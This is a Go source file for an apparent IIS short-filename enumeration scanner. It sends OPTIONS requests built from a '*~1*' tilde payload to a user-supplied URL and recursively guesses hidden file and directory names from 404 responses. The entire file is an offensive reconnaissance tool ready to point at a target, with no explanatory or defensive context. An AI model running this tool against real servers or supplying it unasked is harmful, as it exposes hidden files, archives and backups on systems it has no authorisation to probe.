package main

import (
    "flag"
    "fmt"
    "net/http"
    //"strings"
)

var MAIN string = "\x1b[38;5;85m"
var GREEN string = "\x1b[38;5;82m"
var GRAY string = "\x1b[38;5;246m"
var NAME string = "\x1b[38;5;228m"
var RED string = "\x1b[1;31m"
var FAIL string = "\x1b[1;91m"
var ORANGE string = "\x1b[0;38;5;214m"
var LRED string = "\x1b[0;38;5;196m"
var BOLD string = "\x1b[1m"
var PURPLE string = "\x1b[0;38;5;141m"
var BLUE string = "\x1b[0;38;5;12m"
var UNDERLINE string = "\x1b[4m"
var UNSTABLE string = "\x1b[5m"
var END string = "\x1b[0m"

const payload = "%s*~1*/.aspx"
var extensions = []string{"asp", "aspx", "txt", "bar", "rar", "zip", "7z", "tar.gz", "gz"}

var successLetters []byte
var successStrings []string
var len6 []string
var len66 []string
var url string
var extension string
const letters = "abcdefghijklmnopqrstuvwxyz"

func recursiveRequest(prefix string) {
    for _, letter := range letters {
        target := fmt.Sprintf(url+payload, prefix+string(letter)) + extension
        
        req, err := http.NewRequest("OPTIONS", target, nil)
        if err != nil {
            fmt.Println("Error creating request:", err)
            return
        }
        resp, err := http.DefaultClient.Do(req)
        if err != nil {
            fmt.Println("Error sending request:", err)
            return
        }
        defer resp.Body.Close()
        if resp.StatusCode == 404 {
            if len(prefix+string(letter)) ==  6{
                success := fmt.Sprintf("%s%s\t\t%d%s\t\t\t\t\t%s", MAIN, target, resp.StatusCode, END, prefix+string(letter))
                fmt.Println(success)

            }
            newPrefix := prefix + string(letter)
            successLetters = append(successLetters, byte(letter))
            if (len(newPrefix)%6 == 0){
                successLetters = append(successLetters, '\n')

            }
            recursiveRequest(newPrefix)
        }
    }
    
}

func main() {
    flag.StringVar(&url, "u", "", "url")
    flag.StringVar(&extension, "e", "", "extension")
    flag.Parse()
    if url == "" {
        fmt.Println("Please provide a url with -u flag")
        return
    }
    banner := fmt.Sprintf("%s%sURL%s\t\t\t\t\t\t%sSTATUS CODE%s\t\t\t\t%sDIRECTORY%s\n", BOLD, ORANGE, END, ORANGE, END, ORANGE, END)
    fmt.Println(banner)
    recursiveRequest("")
    for _, b := range successLetters {
        successStrings = append(successStrings, string(b)) 
    }


}

